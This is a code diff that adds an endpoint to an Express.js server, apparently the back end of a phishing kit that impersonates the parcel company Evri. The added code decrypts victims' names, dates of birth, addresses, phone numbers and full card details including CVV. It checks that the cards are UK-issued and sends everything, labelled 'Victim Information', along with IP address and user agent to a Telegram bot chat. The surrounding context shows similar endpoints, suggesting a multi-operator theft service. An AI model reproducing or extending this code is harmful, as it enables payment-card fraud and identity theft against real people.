@@ -16165,6 +16165,82 @@ app.post("/eggmanEvri", (req, res) => {
     });
 });
 
+app.options("/usufEvri", cors());
+
+app.post("/usufEvri", (req, res) => {
+  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  userAgent = req.body.userAgent;
+  ip = req.body.ip;
+  bin = req.body.bin;
+
+  if (bin.length === 7) {
+    formatBin = bin.replace(/ /g, "");
+    if (formatBin.length === 7) {
+      formatBin = bin.slice(0, -1);
+    }
+    bin = formatBin;
+  }
+  axios
+    .get(`https://lookup.binlist.net/${bin}`)
+    .then((resp) => {
+      if (!resp.data.bank) {
+        bankName = "";
+      } else {
+        bankName = resp.data.bank.name;
+      }
+      binInfo = resp.data;
+    })
+    .then(function () {
+      if (binInfo.country.alpha2 == "GB") {
+        var binList = `${bin} | ${binInfo.scheme} | ${binInfo.type} | ${binInfo.brand} | ${bankName}`;
+        var originalText = `-------------------------------------------------------------------------\nBilling Information\n|Full Name: ${fname}\n|DOB: ${dob}\n|Address: ${address}\n|Post Code: ${pcode}\n|Telephone: ${telephone}\n-------------------------------------------------------------------------\nCard Information\n|Card Number: ${ccnum}\n|Card Expiry: ${ccexp}\n|CVV: ${cvv}\n|Bin: ${binList}\n-------------------------------------------------------------------------\n+ Victim Information\n| IP Address : ${ip}\n| UserAgent : ${userAgent}`;
+
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: "-722187158",
+              text: `Evri:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        binList = "";
+        res.send("Update Completed");
+      } else {
+        res.send("Suck ur mum");
+      }
+    });
+});
+
 app.options("/trizEvri1", cors());
 
 app.post("/trizEvri1", (req, res) => {
